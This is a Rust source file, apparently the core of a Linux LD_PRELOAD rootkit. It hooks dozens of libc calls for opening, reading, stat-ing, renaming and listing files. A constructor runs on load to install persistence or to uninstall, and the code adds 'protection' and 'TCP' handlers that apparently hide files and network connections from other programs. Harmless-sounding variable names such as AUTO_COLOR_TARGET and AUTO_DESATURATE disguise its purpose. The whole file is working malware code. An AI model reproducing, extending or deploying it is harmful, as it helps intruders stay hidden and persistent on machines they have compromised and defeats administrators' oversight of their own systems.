extern crate libc;
extern crate ctor;
extern crate log;
extern crate colog;
extern crate regex;

mod persistance;
mod uninstall;

use libc::{
    c_char, c_int, c_uint, PATH_MAX
};
use std::{
    ffi::CStr, path::{Path, PathBuf}, env
};

use dylib_hook::{create_hook, disable_hooks};


mod hook_tcp;
mod hook_protection;

create_hook!(open(cpath: *const c_char, oflag: c_int) -> c_int);
create_hook!(open64(cpath: *const c_char, oflag: c_int) -> c_int);
create_hook!(openat(dirfd: c_int, cpath: *const c_char, oflag: c_int) -> c_int);
create_hook!(openat64(dirfd: c_int, cpath: *const c_char, oflag: c_int) -> c_int);
create_hook!(fopen(cpath: *const c_char, mode: *const c_char) -> *mut libc::FILE);
create_hook!(fopen64(cpath: *const c_char, mode: *const c_char) -> *mut libc::FILE);
create_hook!(rename(oldpath: *const c_char, newpath: *const c_char) -> c_int);
create_hook!(access(path: *const c_char, mode: c_int) -> c_int);
create_hook!(realpath(path: *const c_char, resolved_path: *mut c_char) -> *mut c_char);
create_hook!(read(fd: c_int, buf: *mut libc::c_void, count: usize) -> isize);
create_hook!(pread(fd: c_int, buf: *mut libc::c_void, count: usize, offset: libc::off_t) -> isize);
create_hook!(chmod(path: *const c_char, mode: libc::mode_t) -> c_int);
create_hook!(fchmod(fd: c_int, mode: libc::mode_t) -> c_int);
create_hook!(fchmodat(dirfd: c_int, path: *const c_char, mode: libc::mode_t, flags: c_int) -> c_int);
create_hook!(unlink(path: *const c_char) -> c_int);
create_hook!(unlinkat(dirfd: c_int, path: *const c_char, flags: c_int) -> c_int);
create_hook!(renameat(olddirfd: c_int, oldpath: *const c_char, newdirfd: c_int, newpath: *const c_char) -> c_int);
create_hook!(stat(path: *const c_char, buf: *mut libc::stat) -> c_int);
create_hook!(lstat(path: *const c_char, buf: *mut libc::stat) -> c_int);
create_hook!(fstat(fd: c_int, buf: *mut libc::stat) -> c_int);
create_hook!(fstatat(dirfd: c_int, path: *const c_char, buf: *mut libc::stat, flags: c_int) -> c_int);
create_hook!(statx(dirfd: c_int, path: *const c_char, flags: c_int, mask: c_uint, buf: *mut libc::statx) -> c_int);
create_hook!(faccessat(dirfd: c_int, path: *const c_char, mode: c_int, flags: c_int) -> c_int);
create_hook!(readdir(dirp: *mut libc::DIR) -> *mut libc::dirent);
create_hook!(readdir64(dirp: *mut libc::DIR) -> *mut libc::dirent64);
create_hook!(scandir(dir: *const c_char, namelist: *mut *mut *mut libc::dirent, filter: Option<unsafe extern "C" fn(*const libc::dirent) -> c_int>, compar: Option<unsafe extern "C" fn(*const libc::dirent, *const libc::dirent) -> c_int>) -> c_int);
create_hook!(scandir64(dir: *const c_char, namelist: *mut *mut *mut libc::dirent64, filter: Option<unsafe extern "C" fn(*const libc::dirent64) -> c_int>, compar: Option<unsafe extern "C" fn(*const libc::dirent64, *const libc::dirent64) -> c_int>) -> c_int);

pub fn resolve_fd(dirfd: c_int) -> Option<String> {
    if dirfd == libc::AT_FDCWD {
        return std::env::current_dir()
            .ok()
            .map(|cwd| cwd.to_string_lossy().to_string());
    }

    let fd_path = PathBuf::from(format!("/proc/self/fd/{}", dirfd));
    let mut buf = vec![0; PATH_MAX as usize];
    let len = unsafe {
        libc::readlink(
            fd_path.to_string_lossy().as_ptr() as *const c_char,
            buf.as_mut_ptr() as *mut c_char,
            PATH_MAX as usize,
        )
    };

    if len == -1 {
        // Commented out due to noise log::error!("[resolve_fd] Failed to resolve dirfd '{}'", fd_path.display());
        return None;
    }

    Some(unsafe { CStr::from_ptr(buf.as_ptr()).to_string_lossy().to_string() })
}

pub fn resolve_fd_path(dirfd: c_int, cpath: *const c_char) -> Option<PathBuf> {
    if cpath.is_null() {
        return resolve_fd(dirfd).map(PathBuf::from);
    }

    let path = unsafe { CStr::from_ptr(cpath) };

    if path.to_bytes().starts_with(b"/") {
        return Some(PathBuf::from(path.to_string_lossy().to_string()));
    }

    let resolved_path = resolve_fd(dirfd)?;
    let resolved_path = Path::new(&resolved_path);
    let binding = path.to_string_lossy();
    let path = Path::new(binding.as_ref());
    let new_path = resolved_path.join(path);

    Some(new_path)
}

#[ctor::ctor]
fn init() {
    if let Ok(log_level) = env::var("AUTO_COLOR_LOG") {
        colog::default_builder()
            .filter_level(match log_level.to_lowercase().as_str() {
                "error" => log::LevelFilter::Error,
                "warn" => log::LevelFilter::Warn,
                "info" => log::LevelFilter::Info,
                "debug" => log::LevelFilter::Debug,
                "trace" => log::LevelFilter::Trace,
                _ => log::LevelFilter::Off,    
            })
            .init();
    }
    log::info!("[library] Initialization function called for binary: {}", std::env::current_exe().unwrap().display());

    if env::var("AUTO_DESATURATE").is_ok() {
        log::info!("[library] AUTO_DESATURATE is set, uninstalling");
        uninstall::uninstall();
    } else {
        log::info!("[library] AUTO_DESATURATE is not set, testing persistance");
        persistance::persist();
    }

    if let Ok(target_pattern) = env::var("AUTO_COLOR_TARGET") {
        if let Ok(current_exe) = std::env::current_exe() {
            if let Ok(regex) = regex::Regex::new(&target_pattern) {
                if !regex.is_match(current_exe.to_string_lossy().as_ref()) {
                    log::info!("[library] AUTO_COLOR_TARGET doesn't match current executable, disabling hooks");
                    disable_hooks();
                }
                else {
                    log::info!("[library] AUTO_COLOR_TARGET matches current executable, enabling hooks");
                }
            } else {
                log::error!("[library] Invalid regex pattern in AUTO_COLOR_TARGET: {}", target_pattern);
            }
        }
    }

    // Dynamically add file protection hooks
    open::add_hook(hook_protection::handle_open);
    openat::add_hook(hook_protection::handle_openat);
    fopen::add_hook(hook_protection::handle_fopen);
    rename::add_hook(hook_protection::handle_rename);
    access::add_hook(hook_protection::handle_access);
    realpath::add_hook(hook_protection::handle_realpath);
    read::add_hook(hook_protection::handle_read);
    pread::add_hook(hook_protection::handle_pread);
    chmod::add_hook(hook_protection::handle_chmod);
    fchmod::add_hook(hook_protection::handle_fchmod);
    fchmodat::add_hook(hook_protection::handle_fchmodat);
    unlink::add_hook(hook_protection::handle_unlink);
    unlinkat::add_hook(hook_protection::handle_unlinkat);
    renameat::add_hook(hook_protection::handle_renameat);
    stat::add_hook(hook_protection::handle_stat);
    lstat::add_hook(hook_protection::handle_lstat);
    fstat::add_hook(hook_protection::handle_fstat);
    fstatat::add_hook(hook_protection::handle_fstatat);
    statx::add_hook(hook_protection::handle_statx);
    faccessat::add_hook(hook_protection::handle_faccessat);
    readdir::add_hook(hook_protection::handle_readdir);
    readdir64::add_hook(hook_protection::handle_readdir64);
    scandir::add_hook(hook_protection::handle_scandir);
    scandir64::add_hook(hook_protection::handle_scandir64);
    open64::add_hook(hook_protection::handle_open64);
    openat64::add_hook(hook_protection::handle_openat64);
    fopen64::add_hook(hook_protection::handle_fopen64);

    // Dynamically add TCP protect hooks
    open::add_hook(hook_tcp::handle_open);
    openat::add_hook(hook_tcp::handle_openat);
    fopen::add_hook(hook_tcp::handle_fopen);
    open64::add_hook(hook_tcp::handle_open64);
    openat64::add_hook(hook_tcp::handle_openat64);
    fopen64::add_hook(hook_tcp::handle_fopen64);
}
